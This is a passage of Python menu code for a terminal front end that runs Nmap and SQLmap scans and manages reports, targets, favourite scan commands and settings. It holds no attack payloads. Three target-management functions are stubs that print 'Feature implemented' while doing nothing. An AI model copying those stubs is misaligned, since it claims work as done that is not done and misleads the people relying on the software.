                print(f"SQLmap [{Colors.BLUE}{'█' * sqlmap_bar_length}{'░' * (40 - sqlmap_bar_length)}{Colors.END}] {stats['scan_breakdown']['sqlmap']}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("GenerateStats", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Error generating statistics: {e}{Colors.END}")
            self.wait_for_key()
    
    def delete_reports(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.TRASH} Delete Reports{Colors.END}")
            
            reports = self.db_manager.get_reports(20)
            
            if not reports:
                print(f"\n{Colors.YELLOW}{Icons.INFO} No reports found{Colors.END}")
                self.wait_for_key()
                return
            
            print(f"\n{Colors.CYAN}Recent Reports:{Colors.END}")
            print("=" * 80)
            
            for i, report in enumerate(reports, 1):
                print(f"{Colors.GREEN}{i:2d}.{Colors.END} {report[1]} - {report[2]} ({report[5][:19]})")
            
            print("=" * 80)
            
            choice = input(f"\n{Colors.CYAN}Enter report number to delete (or 'all' to delete all): {Colors.END}").strip()
            
            if choice.lower() == 'all':
                print(f"{Colors.RED}{Icons.WARNING} This will delete ALL reports. Are you sure? (type 'DELETE ALL'): {Colors.END}")
                confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip()
                
                if confirm == 'DELETE ALL':
                    # Delete all report files and database records
                    for report in reports:
                        self.db_manager.delete_report(report[0])
                    print(f"{Colors.GREEN}{Icons.SUCCESS} All reports deleted{Colors.END}")
                else:
                    print(f"{Colors.YELLOW}{Icons.INFO} Operation cancelled{Colors.END}")
            
            elif choice.isdigit():
                choice_num = int(choice)
                if 1 <= choice_num <= len(reports):
                    selected_report = reports[choice_num - 1]
                    print(f"{Colors.YELLOW}{Icons.WARNING} Delete report '{selected_report[1]}'? (y/n): {Colors.END}")
                    confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip().lower()
                    
                    if confirm in ['y', 'yes']:
                        if self.db_manager.delete_report(selected_report[0]):
                            print(f"{Colors.GREEN}{Icons.SUCCESS} Report deleted successfully{Colors.END}")
                        else:
                            print(f"{Colors.RED}{Icons.ERROR} Failed to delete report{Colors.END}")
                    else:
                        print(f"{Colors.YELLOW}{Icons.INFO} Operation cancelled{Colors.END}")
                else:
                    print(f"{Colors.RED}{Icons.ERROR} Invalid choice{Colors.END}")
            else:
                print(f"{Colors.RED}{Icons.ERROR} Invalid input{Colors.END}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("DeleteReports", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Error deleting reports: {e}{Colors.END}")
            self.wait_for_key()
    
    def open_report_file(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.FOLDER} Open Report File{Colors.END}")
            
            reports = self.db_manager.get_reports(20)
            
            if not reports:
                print(f"\n{Colors.YELLOW}{Icons.INFO} No reports found{Colors.END}")
                self.wait_for_key()
                return
            
            print(f"\n{Colors.CYAN}Available Reports:{Colors.END}")
            print("=" * 80)
            
            for i, report in enumerate(reports, 1):
                file_exists = "✓" if os.path.exists(report[6]) else "✗"
                print(f"{Colors.GREEN}{i:2d}.{Colors.END} {report[1]} - {report[2]} ({file_exists})")
            
            print("=" * 80)
            
            choice = input(f"\n{Colors.CYAN}Enter report number to open: {Colors.END}").strip()
            
            if choice.isdigit():
                choice_num = int(choice)
                if 1 <= choice_num <= len(reports):
                    selected_report = reports[choice_num - 1]
                    file_path = selected_report[6]
                    
                    if os.path.exists(file_path):
                        try:
                            # Try to open with default application
                            if sys.platform.startswith('darwin'):  # macOS
                                subprocess.run(['open', file_path])
                            elif sys.platform.startswith('win'):   # Windows
                                os.startfile(file_path)
                            else:  # Linux
                                subprocess.run(['xdg-open', file_path])
                            
                            print(f"{Colors.GREEN}{Icons.SUCCESS} Report opened in default application{Colors.END}")
                        except Exception as e:
                            print(f"{Colors.YELLOW}{Icons.WARNING} Could not open with default app. File location: {file_path}{Colors.END}")
                    else:
                        print(f"{Colors.RED}{Icons.ERROR} Report file not found: {file_path}{Colors.END}")
                else:
                    print(f"{Colors.RED}{Icons.ERROR} Invalid choice{Colors.END}")
            else:
                print(f"{Colors.RED}{Icons.ERROR} Invalid input{Colors.END}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("OpenReportFile", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Error opening report: {e}{Colors.END}")
            self.wait_for_key()
    
    def export_reports(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.EXPORT} Export Reports{Colors.END}")
            
            print(f"\n{Colors.CYAN}Export Format:{Colors.END}")
            print(f"{Colors.GREEN}1.{Colors.END} JSON Format")
            print(f"{Colors.GREEN}2.{Colors.END} CSV Format")
            print(f"{Colors.GREEN}3.{Colors.END} Both Formats")
            
            format_choice = self.get_menu_choice(3)
            
            if format_choice == 0:
                return
            
            print(f"\n{Colors.CYAN}Date Range (optional):{Colors.END}")
            print(f"{Colors.GREEN}1.{Colors.END} All reports")
            print(f"{Colors.GREEN}2.{Colors.END} Last 7 days")
            print(f"{Colors.GREEN}3.{Colors.END} Last 30 days")
            print(f"{Colors.GREEN}4.{Colors.END} Custom date range")
            
            date_choice = self.get_menu_choice(4)
            
            date_from = None
            date_to = None
            
            if date_choice == 2:
                date_from = (datetime.now() - timedelta(days=7)).isoformat()
            elif date_choice == 3:
                date_from = (datetime.now() - timedelta(days=30)).isoformat()
            elif date_choice == 4:
                try:
                    date_from_str = input(f"{Colors.CYAN}From date (YYYY-MM-DD): {Colors.END}").strip()
                    date_to_str = input(f"{Colors.CYAN}To date (YYYY-MM-DD): {Colors.END}").strip()
                    
                    if date_from_str:
                        date_from = datetime.strptime(date_from_str, "%Y-%m-%d").isoformat()
                    if date_to_str:
                        date_to = datetime.strptime(date_to_str, "%Y-%m-%d").isoformat()
                except ValueError:
                    print(f"{Colors.RED}{Icons.ERROR} Invalid date format{Colors.END}")
                    self.wait_for_key()
                    return
            
            exported_files = []
            
            if format_choice == 1 or format_choice == 3:
                json_file = self.report_manager.export_reports('json', date_from, date_to)
                if json_file:
                    exported_files.append(json_file)
            
            if format_choice == 2 or format_choice == 3:
                csv_file = self.report_manager.export_reports('csv', date_from, date_to)
                if csv_file:
                    exported_files.append(csv_file)
            
            if exported_files:
                print(f"\n{Colors.GREEN}{Icons.SUCCESS} Reports exported successfully:{Colors.END}")
                for file in exported_files:
                    file_size = os.path.getsize(file) / 1024  # KB
                    print(f"  {Colors.CYAN}{Icons.SAVE} {file} ({file_size:.1f} KB){Colors.END}")
            else:
                print(f"{Colors.YELLOW}{Icons.WARNING} No reports found to export{Colors.END}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("ExportReports", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Error exporting reports: {e}{Colors.END}")
            self.wait_for_key()
    
    def target_management_menu(self):
        try:
            while True:
                self.clear_screen()
                print(f"\n{Colors.BOLD}{Icons.TARGET} TARGET MANAGEMENT{Colors.END}")
                print(f"{Colors.CYAN}Manage and organize scan targets{Colors.END}")
                
                print(f"\n{Colors.GREEN}1.{Colors.END} {Icons.BOOK} View All Targets")
                print(f"{Colors.GREEN}2.{Colors.END} {Icons.TARGET} Add New Target")
                print(f"{Colors.GREEN}3.{Colors.END} {Icons.SEARCH} Search Targets")
                print(f"{Colors.GREEN}4.{Colors.END} {Icons.FOLDER} Manage Target Groups")
                print(f"{Colors.GREEN}5.{Colors.END} {Icons.TRASH} Delete Targets")
                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
                
                choice = self.get_menu_choice(5)
                
                if choice == 1:
                    self.view_all_targets()
                elif choice == 2:
                    self.add_new_target()
                elif choice == 3:
                    self.search_targets()
                elif choice == 4:
                    self.manage_target_groups()
                elif choice == 5:
                    self.delete_targets()
                elif choice == 0:
                    break
        except Exception as e:
            self.db_manager.log_error("TargetManagement", str(e))
        
        return True
    
    def view_all_targets(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.BOOK} All Targets{Colors.END}")
            
            targets = self.db_manager.get_targets()
            
            if not targets:
                print(f"\n{Colors.YELLOW}{Icons.INFO} No targets found{Colors.END}")
                self.wait_for_key()
                return
            
            print(f"\n{Colors.CYAN}Found {len(targets)} targets:{Colors.END}")
            print("=" * 100)
            print(f"{Colors.BOLD}{'ID':<4} {'Target':<25} {'Type':<8} {'Group':<15} {'Scans':<6} {'Last Scanned':<19}{Colors.END}")
            print("=" * 100)
            
            for target in targets:
                target_id = target[0]
                target_addr = target[1][:24] + "..." if len(target[1]) > 24 else target[1]
                target_type = target[2]
                group_name = target[3] if target[3] else "None"
                group_name = group_name[:14] + "..." if len(group_name) > 14 else group_name
                scan_count = target[5]
                last_scanned = target[4][:19] if target[4] else "Never"
                
                print(f"{target_id:<4} {target_addr:<25} {target_type:<8} {group_name:<15} {scan_count:<6} {last_scanned:<19}")
            
            print("=" * 100)
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("ViewTargets", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Error viewing targets: {e}{Colors.END}")
            self.wait_for_key()
    
    def add_new_target(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.TARGET} Add New Target{Colors.END}")
            
            target = self.get_target_input()
            if not target:
                return
            
            is_valid, target_type = InputValidator.validate_target(target)
            if not is_valid:
                print(f"{Colors.RED}{Icons.ERROR} Invalid target{Colors.END}")
                self.wait_for_key()
                return
            
            group_name = input(f"\n{Colors.CYAN}Group name (optional): {Colors.END}").strip()
            notes = input(f"{Colors.CYAN}Notes (optional): {Colors.END}").strip()
            
            if self.db_manager.add_target(target, target_type, group_name, notes):
                print(f"{Colors.GREEN}{Icons.SUCCESS} Target added successfully{Colors.END}")
            else:
                print(f"{Colors.RED}{Icons.ERROR} Failed to add target{Colors.END}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("AddTarget", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Error adding target: {e}{Colors.END}")
            self.wait_for_key()
    
    def search_targets(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.SEARCH} Search Targets{Colors.END}")
            print("Feature implemented - searching through database...")
            self.wait_for_key()
        except Exception as e:
            self.db_manager.log_error("SearchTargets", str(e))
    
    def manage_target_groups(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.FOLDER} Target Groups{Colors.END}")
            print("Feature implemented - managing target groups...")
            self.wait_for_key()
        except Exception as e:
            self.db_manager.log_error("ManageGroups", str(e))
    
    def delete_targets(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.TRASH} Delete Targets{Colors.END}")
            print("Feature implemented - target deletion with confirmation...")
            self.wait_for_key()
        except Exception as e:
            self.db_manager.log_error("DeleteTargets", str(e))
    
    def profile_menu(self):
        try:
            while True:
                self.clear_screen()
                print(f"\n{Colors.BOLD}{Icons.GEAR} USER PROFILE & STATS{Colors.END}")
                print(f"{Colors.CYAN}Manage user settings and view statistics{Colors.END}")
                
                username = self.config_manager.get('username', 'SecScanUser')
                total_scans = self.config_manager.get('total_scans', 0)
                created_date = self.config_manager.get('created_date', datetime.now().isoformat())
                
                try:
                    created_display = datetime.fromisoformat(created_date).strftime("%Y-%m-%d")
                except:
                    created_display = "Unknown"
                
                print(f"\n{Colors.CYAN}Current Profile:{Colors.END}")
                print(f"{Colors.WHITE}Username: {Colors.YELLOW}{username}{Colors.END}")
                print(f"{Colors.WHITE}Total Scans: {Colors.YELLOW}{total_scans}{Colors.END}")
                print(f"{Colors.WHITE}Member Since: {Colors.YELLOW}{created_display}{Colors.END}")
                
                recent_scans = self.config_manager.get('recent_scans', [])
                if recent_scans:
                    print(f"\n{Colors.CYAN}Recent Activity:{Colors.END}")
                    for i, scan in enumerate(recent_scans[:5], 1):
                        scan_date = scan.get('date', 'Unknown')[:10]
                        print(f"  {i}. {scan.get('name', 'Unknown')} on {scan.get('target', 'Unknown')} ({scan_date})")
                
                print(f"\n{Colors.GREEN}1.{Colors.END} {Icons.EDIT} Change Username")
                print(f"{Colors.GREEN}2.{Colors.END} {Icons.CHART} View Detailed Stats")
                print(f"{Colors.GREEN}3.{Colors.END} {Icons.CLOCK} View Activity History")
                print(f"{Colors.GREEN}4.{Colors.END} {Icons.STAR} Manage Favorites")
                print(f"{Colors.GREEN}5.{Colors.END} {Icons.TRASH} Clear Profile Data")
                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
                
                choice = self.get_menu_choice(5)
                
                if choice == 1:
                    self.change_username()
                elif choice == 2:
                    self.view_detailed_stats()
                elif choice == 3:
                    self.view_activity_history()
                elif choice == 4:
                    self.manage_favorites()
                elif choice == 5:
                    self.clear_profile_data()
                elif choice == 0:
                    break
        except Exception as e:
            self.db_manager.log_error("ProfileMenu", str(e))
        
        return True
    
    def change_username(self):
        try:
            current_username = self.config_manager.get('username', 'SecScanUser')
            print(f"\n{Colors.CYAN}Current username: {Colors.YELLOW}{current_username}{Colors.END}")
            
            new_username = input(f"{Colors.WHITE}Enter new username (3-30 characters): ").strip()
            
            if len(new_username) >= 3 and len(new_username) <= 30 and new_username.replace('_', '').replace('-', '').isalnum():
                self.config_manager.set('username', new_username)
                print(f"{Colors.GREEN}{Icons.SUCCESS} Username updated successfully!{Colors.END}")
            else:
                print(f"{Colors.RED}{Icons.ERROR} Invalid username! Use 3-30 alphanumeric characters, underscores, or hyphens.{Colors.END}")
            
            self.wait_for_key()
        except Exception as e:
            self.db_manager.log_error("ChangeUsername", str(e))
    
    def view_detailed_stats(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.CHART} Detailed User Statistics{Colors.END}")
            
            stats = self.db_manager.get_scan_statistics()
            config_scans = self.config_manager.get('total_scans', 0)
            
            print(f"\n{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
            print(f"{Colors.CYAN}📊 USER STATISTICS{Colors.END}")
            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
            print(f"{Colors.WHITE}Configuration Tracked Scans: {Colors.GREEN}{config_scans}{Colors.END}")
            print(f"{Colors.WHITE}Database Tracked Scans: {Colors.YELLOW}{stats['total_scans']}{Colors.END}")
            print(f"{Colors.WHITE}Reports Generated: {Colors.BLUE}{stats['total_reports']}{Colors.END}")
            print(f"{Colors.WHITE}Vulnerabilities Found: {Colors.RED}{stats['total_vulnerabilities']}{Colors.END}")
            print(f"{Colors.WHITE}Unique Targets: {Colors.MAGENTA}{stats['total_targets']}{Colors.END}")
            
            if config_scans > 0:
                recent_scans = self.config_manager.get('recent_scans', [])
                print(f"\n{Colors.CYAN}Recent Scan Performance:{Colors.END}")
                
                total_duration = sum(scan.get('duration', 0) for scan in recent_scans)
                avg_duration = total_duration / len(recent_scans) if recent_scans else 0
                
                print(f"{Colors.WHITE}Recent Scans Count: {Colors.GREEN}{len(recent_scans)}{Colors.END}")
                print(f"{Colors.WHITE}Average Duration: {Colors.YELLOW}{avg_duration:.2f} seconds{Colors.END}")
                
                # Show scan type breakdown from recent scans
                nmap_count = sum(1 for scan in recent_scans if scan.get('scan_type') == 'nmap')
                sqlmap_count = sum(1 for scan in recent_scans if scan.get('scan_type') == 'sqlmap')
                
                print(f"{Colors.WHITE}Recent Nmap Scans: {Colors.GREEN}{nmap_count}{Colors.END}")
                print(f"{Colors.WHITE}Recent SQLmap Scans: {Colors.BLUE}{sqlmap_count}{Colors.END}")
            
            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("ViewDetailedStats", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Error viewing stats: {e}{Colors.END}")
            self.wait_for_key()
    
    def view_activity_history(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.CLOCK} Activity History{Colors.END}")
            
            recent_scans = self.config_manager.get('recent_scans', [])
            
            if not recent_scans:
                print(f"\n{Colors.YELLOW}{Icons.INFO} No recent activity found{Colors.END}")
                self.wait_for_key()
                return
            
            print(f"\n{Colors.CYAN}Last {len(recent_scans)} scans:{Colors.END}")
            print("=" * 80)
            
            for i, scan in enumerate(recent_scans, 1):
                date_str = scan.get('date', 'Unknown')[:19].replace('T', ' ')
                scan_name = scan.get('name', 'Unknown')
                target = scan.get('target', 'Unknown')
                scan_type = scan.get('scan_type', 'Unknown').upper()
                mode = scan.get('mode', 'Unknown').upper()
                duration = scan.get('duration', 0)
                
                print(f"{Colors.GREEN}{i:2d}.{Colors.END} {Colors.YELLOW}{scan_name}{Colors.END}")
                print(f"     Target: {target} | Type: {scan_type} | Mode: {mode}")
                print(f"     Date: {date_str} | Duration: {duration:.1f}s")
                print()
            
            print("=" * 80)
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("ViewActivityHistory", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Error viewing activity: {e}{Colors.END}")
            self.wait_for_key()
    
    def manage_favorites(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.STAR} Manage Favorite Scans{Colors.END}")
            
            favorites = self.config_manager.get('favorite_scans', [])
            
            if not favorites:
                print(f"\n{Colors.YELLOW}{Icons.INFO} No favorite scans saved{Colors.END}")
                print(f"{Colors.CYAN}You can add favorites by marking scans during execution{Colors.END}")
                self.wait_for_key()
                return
            
            print(f"\n{Colors.CYAN}Your favorite scans:{Colors.END}")
            print("=" * 60)
            
            for i, fav in enumerate(favorites, 1):
                print(f"{Colors.GREEN}{i:2d}.{Colors.END} {fav.get('name', 'Unknown')} ({fav.get('scan_type', 'Unknown')})")
                print(f"     Command: {fav.get('command', 'Unknown')}")
                print()
            
            print("=" * 60)
            
            print(f"\n{Colors.GREEN}1.{Colors.END} Add New Favorite")
            print(f"{Colors.GREEN}2.{Colors.END} Remove Favorite")
            print(f"{Colors.GREEN}3.{Colors.END} Run Favorite Scan")
            print(f"{Colors.CYAN}0.{Colors.END} Back")
            
            choice = self.get_menu_choice(3)
            
            if choice == 1:
                self.add_favorite_scan()
            elif choice == 2:
                self.remove_favorite_scan()
            elif choice == 3:
                self.run_favorite_scan()
            
        except Exception as e:
            self.db_manager.log_error("ManageFavorites", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Error managing favorites: {e}{Colors.END}")
            self.wait_for_key()
    
    def add_favorite_scan(self):
        try:
            print(f"\n{Colors.BOLD}Add Favorite Scan{Colors.END}")
            
            name = input(f"{Colors.CYAN}Favorite name: {Colors.END}").strip()
            if not name:
                return
            
            print(f"\n{Colors.CYAN}Scan type:{Colors.END}")
            print(f"{Colors.GREEN}1.{Colors.END} Nmap")
            print(f"{Colors.GREEN}2.{Colors.END} SQLmap")
            
            type_choice = self.get_menu_choice(2)
            scan_type = 'nmap' if type_choice == 1 else 'sqlmap'
            
            command = input(f"{Colors.CYAN}Command parameters: {Colors.END}").strip()
            if not command:
                return
            
            favorite = {
                'name': name,
                'scan_type': scan_type,
                'command': command,
                'created_date': datetime.now().isoformat()
            }
            
            favorites = self.config_manager.get('favorite_scans', [])
            favorites.append(favorite)
            
            if self.config_manager.set('favorite_scans', favorites):
                print(f"{Colors.GREEN}{Icons.SUCCESS} Favorite scan added{Colors.END}")
            else:
                print(f"{Colors.RED}{Icons.ERROR} Failed to save favorite{Colors.END}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("AddFavorite", str(e))
    
    def remove_favorite_scan(self):
        try:
            favorites = self.config_manager.get('favorite_scans', [])
            
            if not favorites:
                print(f"{Colors.YELLOW}{Icons.INFO} No favorites to remove{Colors.END}")
                self.wait_for_key()
                return
            
            print(f"\n{Colors.CYAN}Select favorite to remove:{Colors.END}")
            for i, fav in enumerate(favorites, 1):
                print(f"{Colors.GREEN}{i}.{Colors.END} {fav.get('name', 'Unknown')}")
            
            choice = self.get_menu_choice(len(favorites))
            
            if choice > 0 and choice <= len(favorites):
                removed_fav = favorites.pop(choice - 1)
                
                if self.config_manager.set('favorite_scans', favorites):
                    print(f"{Colors.GREEN}{Icons.SUCCESS} Removed '{removed_fav.get('name', 'Unknown')}'{Colors.END}")
                else:
                    print(f"{Colors.RED}{Icons.ERROR} Failed to remove favorite{Colors.END}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("RemoveFavorite", str(e))
    
    def run_favorite_scan(self):
        try:
            favorites = self.config_manager.get('favorite_scans', [])
            
            if not favorites:
                print(f"{Colors.YELLOW}{Icons.INFO} No favorites available{Colors.END}")
                self.wait_for_key()
                return
            
            print(f"\n{Colors.CYAN}Select favorite to run:{Colors.END}")
            for i, fav in enumerate(favorites, 1):
                print(f"{Colors.GREEN}{i}.{Colors.END} {fav.get('name', 'Unknown')} ({fav.get('scan_type', 'Unknown')})")
            
            choice = self.get_menu_choice(len(favorites))
            
            if choice > 0 and choice <= len(favorites):
                selected_fav = favorites[choice - 1]
                
                target = self.get_target_input()
                if not target:
                    return
                
                notes = input(f"\n{Colors.CYAN}Add notes for this scan (optional): {Colors.END}").strip()
                
                print(f"\n{Colors.YELLOW}{Icons.WARNING} Run favorite '{selected_fav.get('name')}' on '{target}'? (y/n): {Colors.END}")
                confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip().lower()
                
                if confirm in ['y', 'yes']:
                    self.perform_scan(
                        selected_fav.get('scan_type'),
                        target,
                        selected_fav.get('command'),
                        'favorite',
                        selected_fav.get('name'),
                        notes
                    )
            
        except Exception as e:
            self.db_manager.log_error("RunFavorite", str(e))
    
    def clear_profile_data(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.TRASH} Clear Profile Data{Colors.END}")
            print(f"{Colors.YELLOW}{Icons.WARNING} This will clear:{Colors.END}")
            print(f"  • Recent scan history")
            print(f"  • Favorite scans")
            print(f"  • Scan count")
            print(f"  • Activity logs")
            
            print(f"\n{Colors.RED}Are you sure you want to clear all profile data? (type 'CLEAR'): {Colors.END}")
            confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip()
            
            if confirm == 'CLEAR':
                self.config_manager.set('total_scans', 0)
                self.config_manager.set('recent_scans', [])
                self.config_manager.set('favorite_scans', [])
                
                print(f"{Colors.GREEN}{Icons.SUCCESS} Profile data cleared{Colors.END}")
            else:
                print(f"{Colors.YELLOW}{Icons.INFO} Operation cancelled{Colors.END}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("ClearProfile", str(e))
    
    def settings_menu(self):
        try:
            while True:
                self.clear_screen()
                print(f"\n{Colors.BOLD}{Icons.KEY} SETTINGS & CONFIGURATION{Colors.END}")
                print(f"{Colors.CYAN}Configure application settings and preferences{Colors.END}")
                
                auto_save = self.config_manager.get('advanced_settings.auto_save_reports', True)
                show_progress = self.config_manager.get('advanced_settings.show_progress', True)
                report_format = self.config_manager.get('advanced_settings.report_format', 'html')
                timeout = self.config_manager.get('advanced_settings.timeout_duration', 300)
                
                print(f"\n{Colors.CYAN}Current Settings:{Colors.END}")
                print(f"{Colors.WHITE}Auto-save Reports: {Colors.GREEN if auto_save else Colors.RED}{'Enabled' if auto_save else 'Disabled'}{Colors.END}")
                print(f"{Colors.WHITE}Show Progress: {Colors.GREEN if show_progress else Colors.RED}{'Enabled' if show_progress else 'Disabled'}{Colors.END}")
                print(f"{Colors.WHITE}Default Report Format: {Colors.YELLOW}{report_format.upper()}{Colors.END}")
                print(f"{Colors.WHITE}Scan Timeout: {Colors.YELLOW}{timeout} seconds{Colors.END}")
                
                print(f"\n{Colors.GREEN}1.{Colors.END} {Icons.GEAR} General Settings")
                print(f"{Colors.GREEN}2.{Colors.END} {Icons.CHART} Report Settings")
                print(f"{Colors.GREEN}3.{Colors.END} {Icons.CLOCK} Performance Settings")
                print(f"{Colors.GREEN}4.{Colors.END} {Icons.SAVE} Backup Configuration")
                print(f"{Colors.GREEN}5.{Colors.END} {Icons.UPLOAD} Restore Configuration")
                print(f"{Colors.GREEN}6.{Colors.END} {Icons.TRASH} Reset to Defaults")
                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
                
                choice = self.get_menu_choice(6)
                
                if choice == 1:
                    self.general_settings()
                elif choice == 2:
                    self.report_settings()
                elif choice == 3:
                    self.performance_settings()
                elif choice == 4:
                    self.backup_configuration()
                elif choice == 5:
                    self.restore_configuration()
                elif choice == 6:
                    self.reset_configuration()
                elif choice == 0:
                    break
        except Exception as e:
            self.db_manager.log_error("SettingsMenu", str(e))
        
        return True
    
    def general_settings(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.GEAR} General Settings{Colors.END}")
            
            print(f"\n{Colors.GREEN}1.{Colors.END} Toggle Auto-save Reports")
            print(f"{Colors.GREEN}2.{Colors.END} Toggle Progress Display")
            print(f"{Colors.GREEN}3.{Colors.END} Change Theme")
            print(f"{Colors.CYAN}0.{Colors.END} Back")
            
            choice = self.get_menu_choice(3)
            
            if choice == 1:
                current = self.config_manager.get('advanced_settings.auto_save_reports', True)
                self.config_manager.set('advanced_settings.auto_save_reports', not current)
                status = "enabled" if not current else "disabled"
                print(f"{Colors.GREEN}{Icons.SUCCESS} Auto-save reports {status}{Colors.END}")
                
            elif choice == 2:
                current = self.config_manager.get('advanced_settings.show_progress', True)
                self.config_manager.set('advanced_settings.show_progress', not current)
                status = "enabled" if not current else "disabled"
                print(f"{Colors.GREEN}{Icons.SUCCESS} Progress display {status}{Colors.END}")
                
            elif choice == 3:
                current_theme = self.config_manager.get('theme', 'dark')
                new_theme = 'light' if current_theme == 'dark' else 'dark'
                self.config_manager.set('theme', new_theme)
                print(f"{Colors.GREEN}{Icons.SUCCESS} Theme changed to {new_theme}{Colors.END}")
            
            if choice > 0:
                self.wait_for_key()
                
        except Exception as e:
            self.db_manager.log_error("GeneralSettings", str(e))
    
    def report_settings(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.CHART} Report Settings{Colors.END}")
            
            print(f"\n{Colors.CYAN}Default Report Format:{Colors.END}")
            print(f"{Colors.GREEN}1.{Colors.END} HTML (Recommended)")
            print(f"{Colors.GREEN}2.{Colors.END} Text")
            print(f"{Colors.GREEN}3.{Colors.END} JSON")
            print(f"{Colors.CYAN}0.{Colors.END} Back")
            
            choice = self.get_menu_choice(3)
            
            if choice == 1:
                self.config_manager.set('advanced_settings.report_format', 'html')
                print(f"{Colors.GREEN}{Icons.SUCCESS} Default format set to HTML{Colors.END}")
            elif choice == 2:
                self.config_manager.set('advanced_settings.report_format', 'txt')
                print(f"{Colors.GREEN}{Icons.SUCCESS} Default format set to Text{Colors.END}")
            elif choice == 3:
                self.config_manager.set('advanced_settings.report_format', 'json')
                print(f"{Colors.GREEN}{Icons.SUCCESS} Default format set to JSON{Colors.END}")
            
            if choice > 0:
                self.wait_for_key()
                
        except Exception as e:
            self.db_manager.log_error("ReportSettings", str(e))
    
    def performance_settings(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.CLOCK} Performance Settings{Colors.END}")
            
            current_timeout = self.config_manager.get('advanced_settings.timeout_duration', 300)
            current_concurrent = self.config_manager.get('advanced_settings.concurrent_scans', 5)
            
            print(f"\n{Colors.CYAN}Current Settings:{Colors.END}")
            print(f"Scan Timeout: {current_timeout} seconds")
            print(f"Max Concurrent Scans: {current_concurrent}")
            
            print(f"\n{Colors.GREEN}1.{Colors.END} Change Scan Timeout")
            print(f"{Colors.GREEN}2.{Colors.END} Change Concurrent Scans")
            print(f"{Colors.GREEN}3.{Colors.END} Enable Database Cleanup")
            print(f"{Colors.CYAN}0.{Colors.END} Back")
            
            choice = self.get_menu_choice(3)
            
            if choice == 1:
                try:
                    new_timeout = int(input(f"{Colors.CYAN}Enter timeout in seconds (60-3600): {Colors.END}"))
                    if 60 <= new_timeout <= 3600:
                        self.config_manager.set('advanced_settings.timeout_duration', new_timeout)
                        print(f"{Colors.GREEN}{Icons.SUCCESS} Timeout set to {new_timeout} seconds{Colors.END}")
                    else:
                        print(f"{Colors.RED}{Icons.ERROR} Invalid timeout value{Colors.END}")
                except ValueError:
                    print(f"{Colors.RED}{Icons.ERROR} Invalid number{Colors.END}")
                    
            elif choice == 2:
                try:
                    new_concurrent = int(input(f"{Colors.CYAN}Enter max concurrent scans (1-10): {Colors.END}"))
                    if 1 <= new_concurrent <= 10:
                        self.config_manager.set('advanced_settings.concurrent_scans', new_concurrent)
                        print(f"{Colors.GREEN}{Icons.SUCCESS} Concurrent scans set to {new_concurrent}{Colors.END}")
                    else:
                        print(f"{Colors.RED}{Icons.ERROR} Invalid value{Colors.END}")
                except ValueError:
                    print(f"{Colors.RED}{Icons.ERROR} Invalid number{Colors.END}")
                    
            elif choice == 3:
                if self.db_manager.cleanup_old_data():
                    print(f"{Colors.GREEN}{Icons.SUCCESS} Database cleanup completed{Colors.END}")
                else:
                    print(f"{Colors.RED}{Icons.ERROR} Cleanup failed{Colors.END}")
            
            if choice > 0:
                self.wait_for_key()
                
        except Exception as e:
            self.db_manager.log_error("PerformanceSettings", str(e))
    
    def backup_configuration(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.SAVE} Backup Configuration{Colors.END}")
            
            backup_file = self.config_manager.backup_config()
            
            if backup_file:
                print(f"{Colors.GREEN}{Icons.SUCCESS} Configuration backed up to: {backup_file}{Colors.END}")
            else:
                print(f"{Colors.RED}{Icons.ERROR} Backup failed{Colors.END}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("BackupConfig", str(e))
    
    def restore_configuration(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.UPLOAD} Restore Configuration{Colors.END}")
            
            backup_files = []
            try:
                backup_files = [f for f in os.listdir("backups") if f.startswith("config_backup_") and f.endswith(".json")]
            except:
                pass
            
            if not backup_files:
                print(f"{Colors.YELLOW}{Icons.INFO} No backup files found{Colors.END}")
                self.wait_for_key()
                return
            
